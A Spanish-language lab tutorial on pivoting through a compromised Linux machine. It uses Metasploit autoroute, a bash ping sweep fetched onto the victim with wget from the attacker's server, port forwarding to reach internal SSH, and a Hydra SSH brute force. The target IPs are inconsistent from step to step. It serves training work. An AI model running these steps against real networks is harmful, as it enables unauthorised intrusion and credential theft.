
---
- TAG: #Laboratorios #Pivoting #Linux 
-----

### Pivoting en Linux - Parte 2

En esta segunda parte, continuamos con el proceso de pivoting en una red interna comprometida, usando **Metasploit** y un script de **bash** para identificar y explotar nuevas máquinas en la red.

---

#### Paso 1: Identificar las interfaces de red en la máquina comprometida

Una vez en el **interprete de Meterpreter** y habiendo comprometido la **máquina intermedia Friendly**, debemos listar las interfaces de red con:

```meterpreter
ipconfig
```

Veremos dos interfaces de red:
1. **Friendly**: la máquina intermedia.
2. **Basic**: la tercera máquina en la red interna que queremos pivotar.

---

#### Paso 2: Poner en segundo plano la sesión de Meterpreter

Para escanear otros dispositivos en la red, debemos poner la sesión de Meterpreter en segundo plano usando:

```bash
Ctrl + Z
```

Verificamos que la sesión sigue activa con:

```bash
sessions -l
```

---

#### Paso 3: Añadir rutas y configurar el enrutamiento

El siguiente paso es enrutar el tráfico para poder escanear la red interna. Cargamos el módulo `autoroute`:

```bash
use /multi/manage/autoroute
```

Asignamos el **SESSION ID** correspondiente (en este caso 1):

```bash
set SESSION 1
```

Luego, ejecutamos el módulo:

```bash
run
```

Verificamos que el enrutamiento ha sido configurado correctamente con:

```bash
route
```

Debemos ver la red interna, por ejemplo, `192.168.0.0/24`.

---

#### Paso 4: Crear un script de escaneo de red en bash

Para identificar otros dispositivos en la red interna, podemos usar un **script de bash** que ejecutaremos en la máquina víctima. Creamos el script en nuestra máquina local:

```bash
nano escaner.sh
```

El contenido del script será el siguiente:

```bash
#!/bin/bash

for i in {1..255}; do
	timeout 1 bash -c "ping -c 1 10.0.10.$i" >/dev/null
	if [ $? -eq 0 ]; then
		echo "El host 10.0.10.$i está activo"
	fi
done
```

Este script realiza un **ping** a todas las IPs en el rango `10.0.10.1 - 10.0.10.255`.

---

#### Paso 5: Transferir el script a la máquina intermedia

Iniciamos un servidor HTTP en nuestra máquina para compartir el script:

```bash
python3 -m http.server 80
```

Volvemos a la sesión de **Meterpreter**:

```bash
sessions -i 1
```

Y descargamos el script a la máquina intermedia:

```bash
wget 1.2.3.4/escaner.sh
```

Donde `1.2.3.4` es la IP de nuestro servidor. Verificamos que el archivo fue transferido:

```bash
ls
```

Asignamos permisos de ejecución al archivo:

```bash
chmod +x escaner.sh
```

Finalmente, ejecutamos el script:

```bash
./escaner.sh
```

Este script nos mostrará los **hosts activos** en la red interna. Las direcciones con `.1` o `.2` suelen ser puertas de enlace, pero debemos anotar las otras direcciones activas.

---

#### Paso 6: Escaneo de puertos con Metasploit

Regresamos a **Metasploit** y utilizamos el módulo de escaneo de puertos TCP para la IP identificada (en este caso, `1.2.3.8`):

```bash
use scanner/portscan/tcp
set RHOSTS 1.2.3.8
run
```

Este módulo nos mostrará los **puertos abiertos** en la máquina objetivo.

---

#### Paso 7: Hacer port forwarding para acceder a los servicios

Usaremos **port forwarding** para redirigir puertos de la máquina víctima a nuestro equipo local. Por ejemplo, si queremos acceder al puerto **22 (SSH)** de la máquina víctima, lo redirigimos al puerto **222** de nuestro equipo:

```bash
session -i 1
portfwd add -l 222 -p 22 -r 1.1.1.8
```

Ahora podemos conectarnos al servicio **SSH** de la máquina víctima desde nuestra terminal local:

```bash
ssh dimitri@127.0.0.1 -p 222
```

De la misma manera, si queremos acceder al puerto **631**, lo redirigimos a nuestro puerto **5000**:

```bash
portfwd add -l 5000 -p 631 -r 1.1.1.8
```

Y podemos acceder al servicio desde el navegador:

```bash
127.0.0.1:5000
```

---

#### Paso 8: Ataque de fuerza bruta con Hydra

Si desean realizar un ataque de fuerza bruta al servicio **SSH**, pueden usar **Hydra** de la siguiente manera:

```bash
hydra -l dimitri -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1 -s 222
```

---

Este es el proceso completo de **pivoting en entornos Linux**. Es importante tener en cuenta que, durante el examen, es probable que el **pivoting** se realice en una máquina **Windows**, por lo que deben adaptar las técnicas a la plataforma que estén atacando.

